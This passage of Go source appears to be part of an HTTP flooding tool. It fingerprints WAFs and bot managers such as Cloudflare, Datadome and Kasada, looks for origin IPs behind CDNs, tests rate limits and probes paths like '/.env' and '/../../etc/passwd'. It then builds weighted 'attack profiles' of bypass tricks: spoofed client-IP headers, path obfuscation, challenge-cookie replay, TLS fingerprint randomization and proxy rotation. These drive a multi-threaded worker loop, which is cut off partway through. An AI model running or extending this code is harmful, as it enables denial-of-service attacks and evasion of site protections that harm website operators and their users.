	result.HasRateLimit, result.RateLimitThreshold = m.reconRateLimit(ctx, hostHdr)

	// Cloudflare-specific details
	if result.WAFType == WAFCloudflare || result.WAFType == WAFCloudflareVShield {
		m.reconCloudflareDetails(ctx, hostHdr, result, "")
	}

	// True-Client-IP check
	result.HasTrueClientIP = m.reconCheckTrueClientIP(ctx, hostHdr)

	m.recon = result
	m.buildAttackProfile()
}

func extractCookies(headers map[string]string, result *ReconResult) {
	for k, v := range headers {
		if strings.ToLower(k) == "set-cookie" {
			parts := strings.SplitN(v, "=", 2)
			if len(parts) == 2 {
				name := strings.TrimSpace(parts[0])
				value := strings.SplitN(parts[1], ";", 2)[0]
				value = strings.TrimSpace(value)
				result.DetectedCookies[name] = value
				result.ChallengeCookies = append(result.ChallengeCookies, name+"="+value)
			}
		}
	}
}

func (m *Manager) reconProbe(ctx context.Context, method, hostHdr, path, ip string) (
	headers map[string]string, body string, server string, statusCode int, rtt time.Duration, err error,
) {
	if path == "" {
		path = m.cfg.Path
	}
	if ip == "" {
		ips := m.snapshotIPs()
		if len(ips) == 0 {
			return nil, "", "", 0, 0, fmt.Errorf("no IPs")
		}
		ip = ips[0]
	}
	addr := fmt.Sprintf("%s:%d", ip, m.cfg.Port)

	tlsCfg := &tls.Config{
		ServerName:         hostHdr,
		InsecureSkipVerify: true,
	}

	start := time.Now()
	conn, err := dialConn(ctx, addr, tlsCfg)
	if err != nil {
		return nil, "", "", 0, 0, err
	}
	defer conn.Close()

	buf := bufPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer bufPool.Put(buf)

	buf.WriteString(method)
	buf.WriteByte(' ')
	buf.WriteString(path)
	buf.WriteString(" HTTP/1.1\r\nHost: ")
	buf.WriteString(hostHdr)
	if m.cfg.Port != 80 && m.cfg.Port != 443 {
		buf.WriteByte(':')
		buf.WriteString(strconv.Itoa(m.cfg.Port))
	}
	buf.WriteString("\r\nUser-Agent: ")
	buf.WriteString(uaPool[0])
	buf.WriteString("\r\nAccept: */*\r\nConnection: close\r\n\r\n")

	if _, err := conn.Write(buf.Bytes()); err != nil {
		return nil, "", "", 0, 0, err
	}

	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	reader := bufio.NewReaderSize(conn, 4096)
	headers = make(map[string]string)

	line, err := reader.ReadString('\n')
	if err != nil {
		return nil, "", "", 0, 0, err
	}
	fmt.Sscanf(line, "%s %d", new(string), &statusCode)
	if statusCode == 0 {
		statusCode = 200
	}

	for {
		line, err = reader.ReadString('\n')
		if err != nil {
			break
		}
		line = strings.TrimRight(line, "\r\n")
		if line == "" {
			break
		}
		parts := strings.SplitN(line, ": ", 2)
		if len(parts) == 2 {
			headers[strings.ToLower(parts[0])] = parts[1]
			if strings.ToLower(parts[0]) == "server" {
				server = parts[1]
			}
		}
	}

	bodyBytes, _ := io.ReadAll(io.LimitReader(reader, 4096))
	body = string(bodyBytes)
	rtt = time.Since(start)

	return headers, body, server, statusCode, rtt, nil
}

func (m *Manager) detectWAF(result *ReconResult, headers map[string]string, body string, statusCode int) {
	h := func(key string) string { return headers[strings.ToLower(key)] }
	server := strings.ToLower(result.ServerHeader)
	bodyLower := strings.ToLower(body)

	// Datadome detection
	if h("x-datadome") != "" || strings.Contains(bodyLower, "datadome") || strings.Contains(bodyLower, "datadome-") {
		result.WAFType = WAFDatadome
		result.WAFConfirmed = true
		result.HasBotManager = true
		result.BotManagerType = "datadome"
		return
	}

	// PerimeterX detection
	if h("x-perimeterx") != "" || strings.Contains(bodyLower, "perimeterx") || strings.Contains(bodyLower, "px-init") {
		result.WAFType = WAFPerimeterX
		result.WAFConfirmed = true
		result.HasBotManager = true
		result.BotManagerType = "perimeterx"
		return
	}

	// Shape Security detection
	if h("x-shape") != "" || strings.Contains(bodyLower, "shape") || strings.Contains(bodyLower, "shape.security") {
		result.WAFType = WAFShape
		result.WAFConfirmed = true
		result.HasBotManager = true
		result.BotManagerType = "shape"
		return
	}

	// Kasada detection
	if h("x-kasada") != "" || strings.Contains(bodyLower, "kasada") || strings.Contains(bodyLower, "kasadabot") {
		result.WAFType = WAFKasada
		result.WAFConfirmed = true
		result.HasBotManager = true
		result.BotManagerType = "kasada"
		return
	}

	// ArkoseLabs detection
	if strings.Contains(bodyLower, "arkoselabs") || strings.Contains(bodyLower, "funcaptcha") || strings.Contains(bodyLower, "arkose") {
		result.WAFType = WAFArkoseLabs
		result.WAFConfirmed = true
		result.HasCaptcha = true
		result.CaptchaType = "arkose"
		result.HasBotManager = true
		result.BotManagerType = "arkose"
		return
	}

	if cfRay := h("cf-ray"); cfRay != "" {
		result.WAFType = WAFCloudflare
		result.WAFConfirmed = true
		result.ResponseHeaders["cf-ray"] = cfRay
	}
	if cfCache := h("cf-cache-status"); cfCache != "" {
		result.WAFType = WAFCloudflare
		result.WAFConfirmed = true
	}
	if strings.Contains(server, "cloudflare") {
		result.WAFType = WAFCloudflare
		result.WAFConfirmed = true
	}
	if strings.Contains(body, "__cf_chl_tk") ||
		strings.Contains(body, "_cf_chl_opt") ||
		strings.Contains(body, "checking your browser") ||
		strings.Contains(body, "cf-browser-verification") ||
		strings.Contains(body, "Just a moment") {
		result.WAFType = WAFCloudflareVShield
		result.WAFConfirmed = true
		result.HasJSChallenge = true
	}
	if strings.Contains(body, "cf-turnstile") || strings.Contains(body, "turnstile") {
		result.HasCaptcha = true
		result.CaptchaType = "turnstile"
	}
	if strings.Contains(body, "challenge-platform") || strings.Contains(body, "challenge-platform") {
		if result.WAFType == WAFCloudflare || result.WAFType == WAFCloudflareVShield {
			result.HasJSChallenge = true
		}
	}

	if xAmzId := h("x-amz-cf-id"); xAmzId != "" {
		if strings.Contains(server, "cloudfront") {
			result.WAFType = WAFAWSCloudFront
			result.WAFConfirmed = true
		} else {
			result.WAFType = WAFAWSWAF
			result.WAFConfirmed = true
		}
	}
	if xAmzReqId := h("x-amz-request-id"); xAmzReqId != "" {
		result.WAFType = WAFAWSWAF
		result.WAFConfirmed = true
	}
	if xAmzCfPop := h("x-amz-cf-pop"); xAmzCfPop != "" {
		if result.WAFType == WAFUnknown {
			result.WAFType = WAFCloudfront
		}
	}
	if strings.Contains(server, "cloudfront") && result.WAFType == WAFUnknown {
		result.WAFType = WAFCloudfront
	}
	// Detect CloudFront with Lambda@Edge blocking (custom behavior)
	if xAmzCfId := h("x-amz-cf-id"); xAmzCfId != "" && statusCode == 403 && strings.Contains(body, "lambda") {
		result.WAFType = WAFCloudfrontBehavior
		result.WAFConfirmed = true
	}

	if strings.Contains(server, "akamai") || strings.Contains(server, "akamaighost") {
		result.WAFType = WAFAkamai
		result.WAFConfirmed = true
	}

	if inc := h("x-iinfo"); inc != "" {
		result.WAFType = WAFImperva
		result.WAFConfirmed = true
	}
	if strings.Contains(server, "incapsula") || strings.Contains(body, "Incapsula") {
		result.WAFType = WAFImperva
		result.WAFConfirmed = true
	}

	if strings.Contains(server, "big-ip") || strings.Contains(server, "f5") {
		result.WAFType = WAFF5BIGIP
		result.WAFConfirmed = true
	}
	if xCt := h("x-content-type-options"); xCt != "" && strings.Contains(server, "big-ip") {
		result.WAFType = WAFF5BIGIP
		result.WAFConfirmed = true
	}

	if strings.Contains(server, "mod_security") || strings.Contains(server, "modsecurity") {
		result.WAFType = WAFModSecurity
		result.WAFConfirmed = true
	}

	if strings.Contains(server, "sucuri") || h("x-sucuri-id") != "" || h("x-sucuri-cache") != "" {
		result.WAFType = WAFSucuri
		result.WAFConfirmed = true
	}

	if strings.Contains(server, "stackpath") || strings.Contains(server, "highwinds") {
		result.WAFType = WAFStackPath
		result.WAFConfirmed = true
	}

	if strings.Contains(body, "recaptcha/api.js") ||
		strings.Contains(body, "g-recaptcha") ||
		strings.Contains(body, "google.com/recaptcha") {
		result.HasCaptcha = true
		result.CaptchaType = "recaptcha"
	}

	if strings.Contains(body, "hcaptcha.com") ||
		strings.Contains(body, "h-captcha") {
		result.HasCaptcha = true
		result.CaptchaType = "hcaptcha"
	}

	if strings.Contains(body, "challenge-form") ||
		strings.Contains(body, "javascript challenge") ||
		(statusCode == 503 && strings.Contains(body, "checking")) {
		result.HasJSChallenge = true
	}

	if h("strict-transport-security") != "" {
		result.HasHSTS = true
	}

	if h("x-waf") != "" || h("x-blocked-by") != "" || h("x-sqreen") != "" {
		result.HasWAFSpecificHeaders = true
	}

	// Enhanced detection: check for generic bot manager patterns
	if !result.WAFConfirmed && !result.HasBotManager {
		botPatterns := []string{
			"x-bot", "x-blocked", "x-bot-detected", "x-bot-score",
			"x-sig", "x-cs", "x-request-verify", "x-verification",
		}
		for _, bp := range botPatterns {
			if h(bp) != "" {
				result.WAFType = WAFGenericBotManager
				result.WAFConfirmed = true
				result.HasBotManager = true
				result.BotManagerType = bp
				break
			}
		}
	}
}

func (m *Manager) accumulateWAFSignals(result *ReconResult, headers map[string]string, body string, statusCode int) {
	h := func(key string) string { return headers[strings.ToLower(key)] }

	// Accumulate CF signals
	if cfRay := h("cf-ray"); cfRay != "" {
		result.ResponseHeaders["cf-ray_multi"] = cfRay
		if result.WAFType == WAFUnknown {
			result.WAFType = WAFCloudflare
			result.WAFConfirmed = true
		}
	}
	if strings.Contains(body, "__cf_chl_tk") || strings.Contains(body, "Just a moment") {
		if result.WAFType == WAFCloudflare || result.WAFType == WAFCloudflareVShield || result.WAFType == WAFUnknown {
			result.WAFType = WAFCloudflareVShield
			result.WAFConfirmed = true
			result.HasJSChallenge = true
		}
	}

	// Check for different WAF responses on different IPs
	if xAmzId := h("x-amz-cf-id"); xAmzId != "" && result.WAFType == WAFUnknown {
		result.WAFType = WAFAWSCloudFront
		result.WAFConfirmed = true
	}
}

func (m *Manager) reconMethods(ctx context.Context, hostHdr string) ([]string, bool) {
	ips := m.snapshotIPs()
	if len(ips) == 0 {
		return nil, false
	}
	addr := fmt.Sprintf("%s:%d", ips[0], m.cfg.Port)
	tlsCfg := &tls.Config{
		ServerName:         hostHdr,
		InsecureSkipVerify: true,
	}

	conn, err := dialConn(ctx, addr, tlsCfg)
	if err != nil {
		return nil, false
	}
	defer conn.Close()

	buf := bufPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer bufPool.Put(buf)

	buf.WriteString("OPTIONS ")
	buf.WriteString(m.cfg.Path)
	buf.WriteString(" HTTP/1.1\r\nHost: ")
	buf.WriteString(hostHdr)
	if m.cfg.Port != 80 && m.cfg.Port != 443 {
		buf.WriteByte(':')
		buf.WriteString(strconv.Itoa(m.cfg.Port))
	}
	buf.WriteString("\r\nUser-Agent: ")
	buf.WriteString(uaPool[1])
	buf.WriteString("\r\nAccept: */*\r\nConnection: close\r\n\r\n")

	if _, err := conn.Write(buf.Bytes()); err != nil {
		return nil, false
	}

	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	reader := bufio.NewReaderSize(conn, 2048)
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			break
		}
		line = strings.TrimRight(line, "\r\n")
		if strings.HasPrefix(strings.ToLower(line), "allow:") {
			methods := strings.Split(strings.TrimSpace(line[6:]), ",")
			for i := range methods {
				methods[i] = strings.TrimSpace(methods[i])
			}
			return methods, true
		}
		if line == "" {
			break
		}
	}
	return nil, false
}

func (m *Manager) reconCheckHTTP2(ctx context.Context, hostHdr string) bool {
	ips := m.snapshotIPs()
	if len(ips) == 0 || m.cfg.Port != 443 {
		return false
	}
	addr := fmt.Sprintf("%s:%d", ips[0], m.cfg.Port)
	tlsCfg := &tls.Config{
		ServerName:         hostHdr,
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2", "http/1.1"},
	}

	conn, err := (&tls.Dialer{
		NetDialer: &net.Dialer{Timeout: 3 * time.Second},
		Config:    tlsCfg,
	}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer conn.Close()

	tlsConn := conn.(*tls.Conn)
	cs := tlsConn.ConnectionState()
	return cs.NegotiatedProtocol == "h2"
}

func (m *Manager) reconCheckWebSocket(ctx context.Context, hostHdr string) bool {
	ips := m.snapshotIPs()
	if len(ips) == 0 {
		return false
	}
	addr := fmt.Sprintf("%s:%d", ips[0], m.cfg.Port)
	tlsCfg := &tls.Config{
		ServerName:         hostHdr,
		InsecureSkipVerify: true,
	}

	conn, err := dialConn(ctx, addr, tlsCfg)
	if err != nil {
		return false
	}
	defer conn.Close()

	buf := bufPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer bufPool.Put(buf)

	buf.WriteString("GET ")
	buf.WriteString(m.cfg.Path)
	buf.WriteString(" HTTP/1.1\r\nHost: ")
	buf.WriteString(hostHdr)
	if m.cfg.Port != 80 && m.cfg.Port != 443 {
		buf.WriteByte(':')
		buf.WriteString(strconv.Itoa(m.cfg.Port))
	}
	buf.WriteString("\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nUser-Agent: ")
	buf.WriteString(uaPool[0])
	buf.WriteString("\r\nAccept: */*\r\n\r\n")

	if _, err := conn.Write(buf.Bytes()); err != nil {
		return false
	}

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	reader := bufio.NewReaderSize(conn, 1024)
	line, err := reader.ReadString('\n')
	if err != nil {
		return false
	}
	return strings.Contains(line, "101") || strings.Contains(line, "Switching")
}

func (m *Manager) reconOriginDiscovery(ctx context.Context, hostHdr string) []string {
	var origins []string
	ips := m.snapshotIPs()
	if len(ips) == 0 {
		return nil
	}

	cname, _ := net.LookupCNAME(hostHdr)
	if cname != "" && cname != hostHdr+"." {
		cname = strings.TrimSuffix(cname, ".")
		originAddrs, err := lookupIPv4(cname)
		if err == nil {
			for _, oa := range originAddrs {
				isCDN := false
				for _, ip := range ips {
					if oa == ip {
						isCDN = true
						break
					}
				}
				if !isCDN {
					origins = append(origins, oa)
				}
			}
		}
	}
	_ = ctx
	return origins
}

func (m *Manager) reconBlockedPaths(ctx context.Context, hostHdr string) []string {
	var blocked []string
	testPaths := []string{
		"/admin", "/wp-admin", "/config.php", "/.env",
		"/../../etc/passwd", "/admin.php",
	}
	for _, p := range testPaths {
		select {
		case <-ctx.Done():
			return blocked
		default:
		}
		ips := m.snapshotIPs()
		if len(ips) == 0 {
			return blocked
		}
		_, _, _, statusCode, _, err := m.reconProbe(ctx, "GET", hostHdr, p, ips[0])
		if err == nil && statusCode == 403 {
			blocked = append(blocked, p)
		}
	}
	return blocked
}

func (m *Manager) reconRateLimit(ctx context.Context, hostHdr string) (bool, int) {
	rapid := 25
	blocked := 0
	statusChanges := make(map[int]int)
	avgResponseTime := time.Duration(0)

	for i := 0; i < rapid; i++ {
		select {
		case <-ctx.Done():
			break
		default:
		}
		ips := m.snapshotIPs()
		if len(ips) == 0 {
			return false, 0
		}
		headers, body, _, statusCode, rtt, err := m.reconProbe(ctx, "GET", hostHdr, "", ips[0])
		if err == nil {
			statusChanges[statusCode]++
			avgResponseTime += rtt

			if statusCode == 429 || statusCode == 503 {
				blocked++
			}
			// Check for rate limit headers
			if headers != nil {
				for k := range headers {
					kl := strings.ToLower(k)
					if strings.Contains(kl, "ratelimit") || strings.Contains(kl, "retry-after") {
						blocked++
					}
				}
			}
			// Check for rate limit body
			bodyLower := strings.ToLower(body)
			if strings.Contains(bodyLower, "rate limit") || strings.Contains(bodyLower, "too many requests") {
				blocked++
			}
		}
	}

	avgResponseTime = avgResponseTime / time.Duration(rapid)
	_ = avgResponseTime

	// Consider rate limited if more than 40% of requests were blocked
	// or if status code distribution is abnormal
	if blocked > rapid/2 || (len(statusChanges) > 3 && statusChanges[200] < rapid/2) {
		return true, rapid
	}
	return false, 0
}

func (m *Manager) reconCloudflareDetails(ctx context.Context, hostHdr string, result *ReconResult, respBody string) {
	// Probe specifically for Cloudflare challenge details
	ips := m.snapshotIPs()
	if len(ips) == 0 {
		return
	}
	_, body, _, _, _, err := m.reconProbe(ctx, "GET", hostHdr, "/cdn-cgi/challenge-platform/scripts/jsd/main.js", ips[0])
	if err == nil {
		if strings.Contains(body, "__cf_chl_tk") || strings.Contains(body, "_cf_chl_opt") {
			result.HasJSChallenge = true
			result.WAFType = WAFCloudflareVShield
		}
	}
	_ = respBody
	_ = ctx
	_ = hostHdr
}

func (m *Manager) reconCheckTrueClientIP(ctx context.Context, hostHdr string) bool {
	ips := m.snapshotIPs()
	if len(ips) == 0 {
		return false
	}
	addr := fmt.Sprintf("%s:%d", ips[0], m.cfg.Port)
	tlsCfg := &tls.Config{
		ServerName:         hostHdr,
		InsecureSkipVerify: true,
	}

	conn, err := dialConn(ctx, addr, tlsCfg)
	if err != nil {
		return false
	}
	defer conn.Close()

	buf := bufPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer bufPool.Put(buf)

	buf.WriteString("GET ")
	buf.WriteString(m.cfg.Path)
	buf.WriteString(" HTTP/1.1\r\nHost: ")
	buf.WriteString(hostHdr)
	if m.cfg.Port != 80 && m.cfg.Port != 443 {
		buf.WriteByte(':')
		buf.WriteString(strconv.Itoa(m.cfg.Port))
	}
	buf.WriteString("\r\nTrue-Client-IP: 1.2.3.4\r\n")
	buf.WriteString("User-Agent: ")
	buf.WriteString(uaPool[0])
	buf.WriteString("\r\nConnection: close\r\n\r\n")

	_, err = conn.Write(buf.Bytes())
	return err == nil
}

// ─── Attack Profile Builder ──────────────────────────────────────────────────

func (m *Manager) buildAttackProfile() {
	r := m.recon
	profile := NewAttackProfile()

	always := []struct {
		t BypassTechnique
		w int
	}{
		{BypassHeaderCaseRandomize, 5},
		{BypassHeaderOrderShuffle, 4},
		{BypassXForwardedForRandom, 6},
		{BypassCacheBuster, 7},
		{BypassRefererRandom, 4},
		{BypassRequestDelayJitter, 3},
		{BypassCookieRandomize, 3},
		{BypassConnectionKeepAlive, 8},
	}
	for _, a := range always {
		profile.AddTechnique(a.t, a.w)
	}

	switch r.WAFType {
	case WAFCloudflare:
		wafTechs := []struct {
			t BypassTechnique
			w int
		}{
			{BypassCFConnectingIP, 8},
			{BypassTrueClientIP, 7},
			{BypassXRealIP, 6},
			{BypassClientIP, 5},
			{BypassPathObfuscateDot, 4},
			{BypassPathObfuscateDoubleSlash, 4},
			{BypassDuplicateHeaders, 3},
			{BypassXForwardedForMulti, 5},
			{BypassForwardedHeader, 3},
			{BypassXForwardedProto, 2},
			{BypassTLSFingerprintRandomize, 4},
			{BypassChallengeCookieReplay, 6},
		}
		for _, a := range wafTechs {
			profile.AddTechnique(a.t, a.w)
		}
		// Add WebSocket bypass if supported
		if r.SupportsWebSocket {
			profile.AddTechnique(BypassWebSocketUpgrade, 5)
		}

	case WAFCloudflareVShield:
		wafTechs := []struct {
			t BypassTechnique
			w int
		}{
			{BypassCFConnectingIP, 8},
			{BypassTrueClientIP, 7},
			{BypassXRealIP, 6},
			{BypassPathObfuscateDot, 5},
			{BypassPathObfuscateDoubleSlash, 5},
			{BypassPathObfuscateSemicolon, 4},
			{BypassPathDoubleEncoding, 4},
			{BypassDuplicateHeaders, 4},
			{BypassCFUnderAttackBypass, 3},
			{BypassTLSJitter, 3},
			{BypassHostHeaderObfuscate, 3},
			{BypassChallengeCookieReplay, 7},
			{BypassTLSFingerprintRandomize, 5},
			{BypassHTTP2PriorKnowledge, 4},
			{BypassEarlyData, 3},
		}
		for _, a := range wafTechs {
			profile.AddTechnique(a.t, a.w)
		}
		if r.SupportsWebSocket {
			profile.AddTechnique(BypassWebSocketUpgrade, 5)
		}

	case WAFAWSWAF, WAFAWSCloudFront, WAFCloudfrontBehavior:
		wafTechs := []struct {
			t BypassTechnique
			w int
		}{
			{BypassXForwardedForMulti, 7},
			{BypassTrueClientIP, 6},
			{BypassPathObfuscateDot, 5},
			{BypassPathDoubleEncoding, 5},
			{BypassContentTypeSwitch, 4},
			{BypassContentTypeMultipart, 4},
			{BypassTransferEncodingChunked, 3},
			{BypassParameterPollution, 4},
			{BypassBodyPadding, 3},
			{BypassAWSVPCHeader, 4},
			{BypassXForwardedProto, 4},
			{BypassXForwardedHost, 3},
			{BypassViaHeader, 3},
			{BypassFromHeader, 2},
		}
		for _, a := range wafTechs {
			profile.AddTechnique(a.t, a.w)
		}

	case WAFModSecurity:
		wafTechs := []struct {
			t BypassTechnique
			w int
		}{
			{BypassPathDoubleEncoding, 8},
			{BypassPathUnicodeNormalize, 7},
			{BypassPathObfuscateNullByte, 6},
			{BypassPathObfuscateBackslash, 5},
			{BypassMethodFuzz, 5},
			{BypassMethodOverride, 4},
			{BypassContentTypeCharset, 4},
			{BypassTransferEncodingObfuscate, 4},
			{BypassLineFolding, 3},
			{BypassTabSeparation, 3},
			{BypassChunkedPadding, 4},
			{BypassMalformedContentType, 3},
			{BypassZeroContentLength, 3},
		}
		for _, a := range wafTechs {
			profile.AddTechnique(a.t, a.w)
		}

	case WAFImperva:
		wafTechs := []struct {
			t BypassTechnique
			w int
		}{
			{BypassXForwardedForMulti, 7},
			{BypassXForwardedForRandom, 6},
			{BypassPathObfuscateSemicolon, 5},
			{BypassPathObfuscateDot, 5},
			{BypassMethodOverride, 4},
			{BypassContentTypeCharset, 4},
			{BypassCookieRandomize, 3},
			{BypassDuplicateHeaders, 4},
			{BypassViaHeader, 3},
		}
		for _, a := range wafTechs {
			profile.AddTechnique(a.t, a.w)
		}

	case WAFF5BIGIP:
		wafTechs := []struct {
			t BypassTechnique
			w int
		}{
			{BypassPathObfuscateDot, 6},
			{BypassPathObfuscateDoubleSlash, 6},
			{BypassPathObfuscateSemicolon, 5},
			{BypassContentTypeSwitch, 4},
			{BypassMethodFuzz, 4},
			{BypassDuplicateHeaders, 4},
			{BypassTransferEncodingChunked, 3},
		}
		for _, a := range wafTechs {
			profile.AddTechnique(a.t, a.w)
		}

	case WAFDatadome:
		wafTechs := []struct {
			t BypassTechnique
			w int
		}{
			{BypassDatadomeBypass, 8},
			{BypassTrueClientIP, 6},
			{BypassXForwardedForRandom, 5},
			{BypassPathObfuscateDot, 4},
			{BypassCookieRandomize, 7},
			{BypassChallengeCookieReplay, 7},
			{BypassTLSFingerprintRandomize, 6},
			{BypassHeaderCaseRandomize, 5},
			{BypassHeaderOrderShuffle, 4},
			{BypassCacheBuster, 5},
			{BypassRefererRandom, 4},
			{BypassRequestDelayJitter, 5},
		}
		for _, a := range wafTechs {
			profile.AddTechnique(a.t, a.w)
		}

	case WAFPerimeterX:
		wafTechs := []struct {
			t BypassTechnique
			w int
		}{
			{BypassPerimeterXBypass, 8},
			{BypassTrueClientIP, 6},
			{BypassXForwardedForRandom, 5},
			{BypassCookieRandomize, 7},
			{BypassChallengeCookieReplay, 7},
			{BypassTLSFingerprintRandomize, 6},
			{BypassHeaderCaseRandomize, 5},
			{BypassCacheBuster, 5},
			{BypassRequestDelayJitter, 5},
		}
		for _, a := range wafTechs {
			profile.AddTechnique(a.t, a.w)
		}

	case WAFKasada:
		wafTechs := []struct {
			t BypassTechnique
			w int
		}{
			{BypassKasadaBypass, 8},
			{BypassTLSFingerprintRandomize, 8},
			{BypassCookieRandomize, 6},
			{BypassChallengeCookieReplay, 6},
			{BypassHeaderCaseRandomize, 5},
			{BypassCacheBuster, 5},
			{BypassRequestDelayJitter, 5},
			{BypassHTTP2PriorKnowledge, 4},
		}
		for _, a := range wafTechs {
			profile.AddTechnique(a.t, a.w)
		}

	case WAFArkoseLabs:
		wafTechs := []struct {
			t BypassTechnique
			w int
		}{
			{BypassXForwardedForRandom, 6},
			{BypassTrueClientIP, 5},
			{BypassTLSFingerprintRandomize, 5},
			{BypassCookieRandomize, 5},
			{BypassHeaderCaseRandomize, 4},
			{BypassRequestDelayJitter, 6},
			{BypassCacheBuster, 4},
		}
		for _, a := range wafTechs {
			profile.AddTechnique(a.t, a.w)
		}

	default:
		generic := []struct {
			t BypassTechnique
			w int
		}{
			{BypassPathObfuscateDot, 5},
			{BypassPathObfuscateDoubleSlash, 5},
			{BypassPathObfuscateSemicolon, 4},
			{BypassPathDoubleEncoding, 4},
			{BypassContentTypeSwitch, 4},
			{BypassMethodFuzz, 3},
			{BypassTransferEncodingChunked, 3},
			{BypassDuplicateHeaders, 3},
			{BypassRangeRequest, 2},
			{BypassHTTP10, 2},
			{BypassTLSFingerprintRandomize, 3},
		}
		for _, a := range generic {
			profile.AddTechnique(a.t, a.w)
		}
	}

	if len(r.OriginIPs) > 0 {
		profile.AddTechnique(BypassOriginIPDirect, 8)
	}

	if len(m.proxies) > 0 {
		profile.AddTechnique(BypassProxyRotate, 7)
	}

	if r.HasCaptcha {
		for i, t := range profile.Techniques {
			if t == BypassRequestDelayJitter {
				profile.Weights[i] = 10
				profile.TechniqueMap[t] = 10
			}
		}
	}

	if r.SupportsHTTP2 {
		profile.AddTechnique(BypassHTTP2PriorKnowledge, 5)
		profile.AddTechnique(BypassHTTP2SettingsFrame, 3)
		profile.AddTechnique(BypassHTTP2RSTStream, 2)
		profile.AddTechnique(BypassHTTP2Ping, 2)
		profile.AddTechnique(BypassHTTP2WindowUpdate, 2)
	}

	if r.SupportsWebSocket {
		profile.AddTechnique(BypassWebSocketUpgrade, 4)
		profile.AddTechnique(BypassWebSocketContinuous, 3)
	}

	// Add request pipelining for high-throughput environments
	profile.AddTechnique(BypassRequestPipelining, 3)
	profile.AddTechnique(BypassResponseDelay, 2)

	m.profile = profile
}

// ─── Manager: worker lifecycle ────────────────────────────────────────────────

type workerEntry struct{ cancel context.CancelFunc }

func (m *Manager) runManager(ctx context.Context) {
	workers := make(map[string][]workerEntry)

	spawn := func(ip string) {
		wctx, wcancel := context.WithCancel(ctx)
		workers[ip] = append(workers[ip], workerEntry{cancel: wcancel})
		go m.workerLoop(wctx, ip)
	}

	m.rebalance(m.snapshotIPs(), workers, spawn)

	for {
		select {
		case <-ctx.Done():
			for _, list := range workers {
				for _, w := range list {
					w.cancel()
				}
			}
			return
		case newIPs := <-m.rebalanceCh:
			m.rebalance(newIPs, workers, spawn)
		}
	}
}

func (m *Manager) rebalance(ipsList []string, workers map[string][]workerEntry, spawn func(string)) {
	n := len(ipsList)
	if n == 0 {
		for ip, list := range workers {
			for _, w := range list {
				w.cancel()
			}
			delete(workers, ip)
		}
		slog.Warn("rebalance: no IPs available; all workers cancelled")
		return
	}

	base := m.cfg.Threads / n
	extra := m.cfg.Threads % n
	desired := make(map[string]int, n)
	for i, ip := range ipsList {
		desired[ip] = base
		if i < extra {
			desired[ip]++
		}
	}

	for ip, list := range workers {
		if _, ok := desired[ip]; !ok {
			for _, w := range list {
				w.cancel()
			}
			delete(workers, ip)
		}
	}

	for ip, want := range desired {
		have := len(workers[ip])
		for i := 0; i < want-have; i++ {
			spawn(ip)
		}
		for i := 0; i < have-want; i++ {
			w := workers[ip][0]
			w.cancel()
			workers[ip] = workers[ip][1:]
		}
	}

	slog.Info("rebalance complete", "desired", desired, "running", mapCounts(workers))
}

func mapCounts(workers map[string][]workerEntry) map[string]int {
	out := make(map[string]int, len(workers))
	for ip, list := range workers {
		out[ip] = len(list)
	}
	return out
}

// ─── Worker ───────────────────────────────────────────────────────────────────

func (m *Manager) workerLoop(ctx context.Context, ip string) {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	perRNG := rand.New(rand.NewSource(time.Now().UnixNano() + int64(rng.Intn(99999))))

	hostHdr := m.cfg.Target.Hostname()
	if m.cfg.CustomHost != "" {
		hostHdr = m.cfg.CustomHost
	}

	addr := fmt.Sprintf("%s:%d", ip, m.cfg.Port)

	select {
	case <-m.reconReady:
	case <-ctx.Done():
		return
	}

	backoff := 50 * time.Millisecond
	profile := m.profile
	recon := m.recon

	tlsCfg := &tls.Config{
		ServerName:         hostHdr,
		InsecureSkipVerify: true,
	}

	var cookies []string
	var lastChallengeCookie string

	// For request pipelining
	var pipelineBuf bytes.Buffer
	var pipelineCount int

	for {
		if ctx.Err() != nil {
			return
		}

		// Adaptive jitter based on recon
		if m.shouldUseTechnique(profile, BypassRequestDelayJitter, rng) {
			jitter := time.Duration(math.Abs(rng.NormFloat64() * 50))
			if recon.HasCaptcha {
				jitter = time.Duration(math.Abs(rng.NormFloat64() * 200))
			}
			select {
			case <-ctx.Done():
				return
			case <-time.After(jitter * time.Millisecond):
			}
		}

		connectAddr := addr
		if len(recon.OriginIPs) > 0 && m.shouldUseTechnique(profile, BypassOriginIPDirect, rng) {
			originIP := recon.OriginIPs[rng.Intn(len(recon.OriginIPs))]
			connectAddr = fmt.Sprintf("%s:%d", originIP, recon.OriginPort)
		}

		// Proxy rotation
		if len(m.proxies) > 0 && m.shouldUseTechnique(profile, BypassProxyRotate, rng) {
			idx := m.proxyIdx.Add(1) % int64(len(m.proxies))
			proxyAddr := m.proxies[idx]
			// For now, just use proxy as connection address
			// In a full implementation, this would use SOCKS5 dialer
			connectAddr = proxyAddr
		}

		conn, err := dialConn(ctx, connectAddr, tlsCfg)
		if err != nil {
			select {
			case <-ctx.Done():
				return
			case <-time.After(backoff):
			}
			backoff = minDuration(backoff*2, 5*time.Second)
			slog.Debug("dial failed", "addr", connectAddr, "err", err, "backoff", backoff)
			m.totalErrors.Add(1)
			continue
		}
		backoff = 50 * time.Millisecond

		method := m.selectRandomMethod(rng, recon)

		// Challenge cookie replay
		if lastChallengeCookie != "" && m.shouldUseTechnique(profile, BypassChallengeCookieReplay, rng) {
			cookies = append(cookies, lastChallengeCookie)
		}

		// Request pipelining: batch multiple requests if enabled
		pipelineCount = 0
		pipelineBuf.Reset()
		if m.shouldUseTechnique(profile, BypassRequestPipelining, rng) {
			pipelineCount = 2 + rng.Intn(3) // 2-4 pipelined requests
		}

	burstLoop:
		for {
			select {
			case <-ctx.Done():
				conn.Close()
				return
			default:
				if pipelineCount > 0 {
					// Pipelining mode: batch requests before reading
					var pipelineBody []byte
					for i := 0; i < pipelineCount; i++ {
